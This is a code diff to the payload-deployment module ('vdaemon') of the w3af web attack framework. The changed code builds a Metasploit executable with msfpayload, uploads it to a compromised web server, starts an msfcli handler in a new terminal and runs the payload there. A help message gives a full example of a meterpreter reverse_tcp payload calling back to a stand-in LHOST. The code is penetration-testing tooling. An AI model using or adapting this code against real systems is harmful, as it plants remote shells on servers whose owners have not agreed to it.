@@ -32,6 +32,7 @@ import os
 import tempfile
 import random
 import subprocess
+import time
 
 
 class vdaemon(object):
@@ -67,15 +68,41 @@ class vdaemon(object):
         
         #
         #    We follow the same order as MSF, but we only allow the user to generate executable files
-        #    If the user tries to create a payload for a wrong OS, we'll warn but allow it.
         #
-        #    Usage: /opt/metasploit3/msf3/msfpayload <payload> [var=val]
+        #    Usage: /opt/metasploit3/msf3/msfpayload <payload> [var=val] ...
         #
-        payload = user_defined_parameters[0]
-        parameters = user_defined_parameters[1:]
+        msg = 'IMPORTANT:\n'
+        msg += '    You need to specify the payload type in MSF format as if you '
+        msg += 'were calling msfpayload: \n'
+        msg += '    linux/x86/meterpreter/reverse_tcp LHOST=1.2.3.4\n'
+        msg += '    And then add a pipe ("|") to add the msfcli parameters for '
+        msg += 'handling the incoming connection (in the case of a reverse '
+        msg += 'shell) or connect to the remote server.\n'
+        msg += '    A complete example looks like this:\n'
+        msg += '    linux/x86/meterpreter/reverse_tcp LHOST=1.2.3.4 | exploit/multi/handler PAYLOAD=linux/x86/meterpreter/reverse_tcp LHOST=1.2.3.4 E'
+
+        if not len(user_defined_parameters):
+            raise w3afException( msg )
+        
+        found_pipe = False
+        for i in user_defined_parameters:
+            if i == '|':
+                found_pipe = True
+                break
+        else:
+            raise w3afException( msg )
+        
+        msfpayload_parameters = user_defined_parameters[:user_defined_parameters.index('|')]
+        msfcli_parameters = user_defined_parameters[user_defined_parameters.index('|')+1:]
+        
+        payload = msfpayload_parameters[0]
+        msfpayload_parameters = msfpayload_parameters[1:]
+        
+        msfcli_handler = msfcli_parameters[0]
+        msfcli_parameters = msfcli_parameters[1:]
         
         try:
-            executable_file_name = self._generate_exe( payload, parameters )
+            executable_file_name = self._generate_exe( payload, msfpayload_parameters )
         except Exception, e:
             raise w3afException( 'Failed to create the payload file, error: "%s".' % str(e) )
         
@@ -90,14 +117,8 @@ class vdaemon(object):
             #    Good, the file is there, now we launch the local listener and then we execute
             #    the remote payload
             #
-            LHOST = 'LHOST=%s' % cf.cf.getData('localAddress')
             
-            domain = urlParser.getDomain(cf.cf.getData('targets')[0])
-            RHOST = 'RHOST=%s' % domain
-            
-            handler_parameters = [ LHOST, RHOST ]
-            
-            if not self._start_local_listener( payload, handler_parameters ):
+            if not self._start_local_listener( msfcli_handler, msfcli_parameters ):
                 om.out.console('Failed to start the local listener for "%s"' % payload)
             else:
                 try:
@@ -107,7 +128,7 @@ class vdaemon(object):
                 else:
                     om.out.console('Successfully executed the MSF payload on the remote server.')
     
-    def _start_local_listener(self, payload, parameters ):
+    def _start_local_listener(self, msfcli_handler, parameters ):
         '''
         Runs something similar to:
         
@@ -117,8 +138,17 @@ class vdaemon(object):
         
         @return: True if it was possible to start the listener in a new console
         '''
-        msfcli_command = '%s exploit/multi/handler PAYLOAD=%s %s E' % (self._msfcli_path, payload, ' '.join(parameters) )
+        msfcli_command = '%s %s %s' % (self._msfcli_path, msfcli_handler, ' '.join(parameters) )
+        om.out.console('Running a new terminal with the payload handler ("%s")' % msfcli_command)
+        
+        # TODO: Add support for KDE, Windows, etc.
         subprocess.Popen( ['gnome-terminal', '-e', msfcli_command] )
+        
+        # Some slow systems require time to load msfcli
+        time.sleep(4)
+        
+        # TODO: Better response!
+        return True
     
     def _generate_exe( self, payload, parameters ):
         '''
@@ -141,6 +171,13 @@ class vdaemon(object):
         os.system( command )
         
         if os.path.isfile( output_filename ):
+            
+            #    Error handling
+            file_content = file(output_filename).read()
+            for tag in ['Invalid', 'Error']:
+                if tag in file_content:
+                    raise w3afException(file_content.strip())
+                
             return output_filename
         else:
             raise w3afException('Something failed while creating the payload file.')
@@ -172,9 +209,13 @@ class vdaemon(object):
             
             self._remote_filename = getRemoteTempFile( self._exec_method )
             om.out.debug('Starting payload upload, remote filename is: "' + self._remote_filename + '".')
-            transferHandler.transfer( exe_file, self._remote_filename )
-        
-        om.out.console('Finished payload upload.')
+            
+            if transferHandler.transfer( file(exe_file).read(), self._remote_filename ):
+                om.out.console('Finished payload upload to "%s"' % self._remote_filename)
+                return self._remote_filename
+            else:
+                raise w3afException('The payload upload failed, remote md5sum is different.')
+                
         
     def _exec_payload( self, remote_file_location ):
         '''
